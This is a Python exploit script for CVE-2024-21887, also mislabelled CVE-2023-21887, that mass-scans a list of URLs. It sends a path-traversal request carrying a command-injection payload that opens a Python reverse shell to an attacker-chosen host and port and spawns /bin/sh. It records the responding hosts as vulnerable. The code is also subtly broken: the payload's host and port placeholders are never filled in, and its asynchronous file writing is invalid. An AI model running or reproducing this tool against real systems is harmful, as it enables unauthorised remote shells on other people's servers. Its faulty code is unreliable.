import argparse
from urllib.parse import *
import asyncio
import httpx

__author__ = 'zwx'
__CVE__ = "CVE-2024-21887"

payload = '''
;python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((f"{host}",{port}));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())';
'''

class CVE_2023_21887:
    def __init__(self, target_file, output_file, host, port):
        self.name = "CVE-2023-21887"
        self.target_file = target_file
        self.output_file = output_file
        self.host = host
        self.port = port

    async def exploit(self, url, session):
        target_path = "/api/v1/totp/user-backup-code/../../license/keys-status/"
        target_url = f"{url}{target_path}{quote(payload)}"
        print(f"[*] Checking {target_url}")
        headers = {
            "Content-Type": "application/json",
        }
        req = await session.get(target_url, headers=headers)
        if req.status_code == 200:
            print(f"[+] {url} is vulnerable")
            print(req.text)
            async with open(self.output_file, "a") as file:
                await file.write(f"{url}\n")
        else:
            print(f"[-] {url} is not vulnerable")

    async def run(self):
        async with httpx.AsyncClient(verify=False) as client:
            tasks = [self.exploit(url.strip(), client) for url in self.read_urls()]
            await asyncio.gather(*tasks)

    def read_urls(self):
        with open(self.target_file, "r") as file:
            return [line.strip() for line in file]


def parse_args():
    parser = argparse.ArgumentParser(description="CVE-2023-21887 Exploit Scanner")
    parser.add_argument(
        "--host", default="", help="Host for reverse shell payload"
    )
    parser.add_argument(
        "--port", type=int, default=443, help="Port for reverse shell payload"
    )
    parser.add_argument(
        "-o", "--output", default="CVE-2023-21887.txt", help="Output file for results"
    )
    parser.add_argument(
        "target_file", default="list.txt", help="File containing a list of URLs to check"
    )
    return parser.parse_args()


if __name__ == "__main__":
    args = parse_args()
    cve = CVE_2023_21887(args.target_file, args.output, args.host, args.port)
    asyncio.run(cve.run())
